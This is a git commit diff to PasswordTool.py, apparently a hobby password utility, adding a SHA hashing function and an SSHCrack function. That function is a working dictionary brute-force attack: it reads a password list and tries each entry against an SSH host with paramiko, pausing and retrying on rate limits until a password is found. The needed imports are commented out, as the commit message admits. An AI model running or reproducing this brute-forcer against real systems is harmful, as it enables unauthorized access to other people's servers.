4000897bad88271d6c0c4d483732e026b9c48026
PaytonGibler01 <paytongibler2@gmail.com>
2022-07-14 19:31:06 -0400

    wrapped it up, all modules combined, not sure if sshCrack will work w/o imports

--- PasswordTool.py
+++ PasswordTool.py
@@ -3,6 +3,12 @@ import sys
 import string
 import re
 from hashlib import md5, sha1, sha224, sha256, sha384, sha512
+#import paramiko 
+import time
+import socket
+#from colorama import init, Fore
+#(init)
+
 # MAKE MAN PAGE, LIKE LEGIT OPTIONS MAN ex: -gc -c -g
 #  STRETCH:  maybe script asks if u want the generated password checked
 #encode
@@ -308,7 +314,86 @@ def timeCrack():
         
     if int(speed) > .01:
         print("Time to crack password: {:,.2f} {}".format(speed, time_))
+def hash_pw():
+# initializing string
+    str = input("Password to hash: ")
+# encoding str using SHA1
+    result = sha1(str.encode())
+# printing the equivalent hexadecimal value.
+    print("SHA1   Hash: " + result.hexdigest())
+    #print(result.hexdigest())
+# encoding str using SHA224()
+    result = sha224(str.encode())
+# printing the equivalent hexadecimal value.
+    print("SHA224 Hash: " + result.hexdigest())
+    #print(result.hexdigest())
+# encoding str using SHA256()
+    result =sha256(str.encode())
+# printing the equivalent hexadecimal value.
+    print("SHA256 Hash: " + result.hexdigest())
+    #print(result.hexdigest())
+# initializing string
+    str = str
+# encoding str using SHA384()
+    result = sha384(str.encode())
+# printing the equivalent hexadecimal value.
+    print("SHA384 Hash: " + result.hexdigest())
+    #print(result.hexdigest())
+# # initializing string
+# str = str
+# initializing string
+    str = str
+# encoding str using SHA512()
+    result = sha512(str.encode())
+# printing the equivalent hexadecimal value.
+    print("SHA512 Hash: " + result.hexdigest())
+    #print(result.hexdigest())
 
+def SSHCrack():
+    GREEN = Fore.GREEN
+
+    def connect(hostname,username,password):
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            client.connect(hostname=hostname, username=username, password=password, timeout=3)
+        
+        except socket.timeout:
+            print(f"Host:{hostname} is unreachable, timedout.")
+            returning = False
+    
+        except paramiko.AuthenticationException:
+            print(f"testing:{password}")
+            returning = False
+    
+        except paramiko.SSHException:
+            print(f"Quota exeeded, returning with delay...")
+            time.sleep(60)
+            returning = connect(hostname,username,password)
+    
+        else:
+            print(f"{Fore.GREEN}Password Found: " + password)
+            return 1
+
+    def Main():
+        host = input("Enter Hostname: ")
+        user = input("Enter Username: ")
+        passlist = input("Enter Password List: ")
+        with open(passlist, "r") as infile:
+            start = time.time()
+            for word in infile:
+                word = word.strip()
+                con = connect(host,user,word)
+                if con == 1:
+                    break
+                else:
+                    continue
+            end = time.time()
+            t_time = end - start
+            print("Total runtime was: ", t_time, "second")    
+
+    Main()
 def main():
     option = sys.argv[1]
     if option == "--g":
@@ -324,5 +409,10 @@ def main():
         hashCrack()
     if option =="--tc":
         timeCrack()
+    if option =="--hp":
+        hash_pw()
+    if option =="--sc":
+        SSHCrack()
+
 
 main()
